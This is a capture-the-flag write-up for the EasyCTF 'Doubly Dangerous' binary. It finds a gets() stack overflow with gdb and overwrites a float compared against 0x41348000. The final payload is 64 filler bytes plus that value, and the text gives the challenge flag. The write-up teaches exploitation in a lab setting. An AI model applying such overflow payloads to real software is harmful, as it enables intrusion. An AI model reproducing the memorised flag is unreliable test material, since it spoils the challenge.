# Doubly Dangerous
picoctf 
-Disclaimer("This writeup is from VoidMercy's https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/binexploit/Doubly%20Dangerous")

"There seems to be an issue with this binary. Can you exploit it?"

< filelink : https://github.com/EasyCTF/easyctf-2017-problems/blob/master/doubly-dangerous/doubly_dangerous?raw=true >

the task gave me an .ELF file, first thing to do is to run it :

```
root@localhost:~/Downloads/New folder# ./doubly_dangerous
Give me a string: 
tekdung 
nope!
root@localhost:~/Downloads/New folder# 
```

this time i tried to give a  l a r g e  input :


```
root@localhost:~/Downloads/New folder# ./doubly_dangerous
Give me a string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
nope!
Segmentation fault
```

it was a buffer overflow, and the porgram referencing to a restricted memory, but we need more clue, so lets start dissas the program using gdb 

```
Dump of assembler code for function main:
   0x08048607 <+0>:	lea    ecx,[esp+0x4]
   0x0804860b <+4>:	and    esp,0xfffffff0
   0x0804860e <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048611 <+10>:	push   ebp
   0x08048612 <+11>:	mov    ebp,esp
   0x08048614 <+13>:	push   ecx
   0x08048615 <+14>:	sub    esp,0x54
   0x08048618 <+17>:	fldz   
   0x0804861a <+19>:	fstp   DWORD PTR [ebp-0xc]
   0x0804861d <+22>:	sub    esp,0xc
   0x08048620 <+25>:	push   0x8048735
   0x08048625 <+30>:	call   0x8048410 <puts@plt>
   0x0804862a <+35>:	add    esp,0x10
   0x0804862d <+38>:	sub    esp,0xc
   0x08048630 <+41>:	lea    eax,[ebp-0x4c]
   0x08048633 <+44>:	push   eax
   0x08048634 <+45>:	call   0x80483e0 <gets@plt>
=> 0x08048639 <+50>:	add    esp,0x10
   0x0804863c <+53>:	fld    DWORD PTR [ebp-0xc]
   0x0804863f <+56>:	fld    DWORD PTR ds:0x804876c
   0x08048645 <+62>:	fucomip st,st(1)
   0x08048647 <+64>:	jp     0x804866c <main+101>
   0x08048649 <+66>:	fld    DWORD PTR ds:0x804876c
```
i found something interesting, the program is using fucomip wich means a compare floating points instruction.
since the program is comparing, i assume that the comparisons must return true.

```
0x0804863c <+53>:	fld    DWORD PTR [ebp-0xc]
0x0804863f <+56>:	fld    DWORD PTR ds:0x804876c
0x08048645 <+62>:	fucomip st,st(1)
```

the program is referencing the variable ebp-0xc and then comparing with the value in address 0x804876c, we need to find a value until the value of ebp-0xc overflow :

```
python -c "print 'a'*60" > weq
---------------------------------------------------------------
(gdb) r < weq
---------------------------------------------------------------
Breakpoint 2, 0x08048686 in main ()
(gdb) x/10wx $ebp-0xc
0xffffd31c:	0x00000000	0xf7f8f3fc	0xffffd340	0x00000000
0xffffd32c:	0xf7dd7793	0xf7f8f000	0xf7f8f000	0x00000000
0xffffd33c:	0xf7dd7793	0x00000001
```
meh

```
python -c "print 'a'*65" > weq
---------------------------------------------------------------
Breakpoint 2, 0x08048686 in main ()
(gdb) x/10wx $ebp-0xc
0xffffd31c:	0x00000061	0xf7f8f3fc	0xffffd340	0x00000000
0xffffd32c:	0xf7dd7793	0xf7f8f000	0xf7f8f000	0x00000000
0xffffd33c:	0xf7dd7793	0x00000001
```
ayyy

```
it is found that 65 character overflow the ebp-0xc
```
the digit '61' means 65 is one number higher, to get a blank spot ebp-0xc we need 64 character so the first value is 0x00000000.
Now to concate what value in the compare destination so fucomip will return true.

```
(gdb) x/10wx 0x804876c
0x804876c:	0x41348000	0x3b031b01	0x00000030	0x00000005
0x804877c:	0xfffffc60	0x0000004c	0xfffffe0b	0x00000070
0x804878c:	0xfffffe97	0x00000090
```

the value we need is 0x41348000. Thus, we can create our exploit

```
root@localhost:~/Downloads/New folder# python -c "print 'a'*64 + '\x00\x80\x34\x41'" | ./doubly_dangerous
Give me a string: 
Success! Here is your flag:
Failed to open flag file! //-------> easyctf{bofs_and_floats_are_d0uble_tr0uble!}
```

# Flag

```
easyctf{bofs_and_floats_are_d0uble_tr0uble!}
```

